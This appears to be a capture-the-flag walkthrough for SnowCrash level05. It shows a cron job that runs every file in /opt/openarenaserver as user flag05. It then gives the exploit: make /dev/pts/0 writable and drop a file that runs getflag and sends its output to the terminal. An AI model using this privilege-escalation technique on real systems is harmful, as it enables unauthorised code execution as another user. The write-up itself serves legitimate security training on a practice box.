when you ssh into, you get:

```
$ ssh level05@localhost -p 4000                               
	   _____                      _____               _   
	  / ____|                    / ____|             | |  
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                      
  Good luck & Have fun

          10.0.2.15 fd17:625c:f037:2:7d82:d7b7:1dc3:9778 fd17:625c:f037:2:a00:27ff:fe1d:c29a 

level05@localhost's password: 
You have new mail.
```

when you now check `/var/mail/level05` you get:

```
cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

As you can see this is some cron setting that means `su -c "sh /usr/sbin/openarenaserver" - flag05` gets executed every 2 minutes.

When you read `/usr/sbin/openarenaserver` you'll see

```Shell
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

As you can see the program executes every file in ``/opt/openarenaserver/``and deletes it.

So you just have to write a program that executes getflag and redirects its output to somewher you can read e.g.: `/dev/pts/0`your shell

So this would would work

```Shell
chmod 622 /dev/pts/0
echo 'getflag > /dev/pts/0' > /opt/openarenaserver/file
# wait until the script executes
```
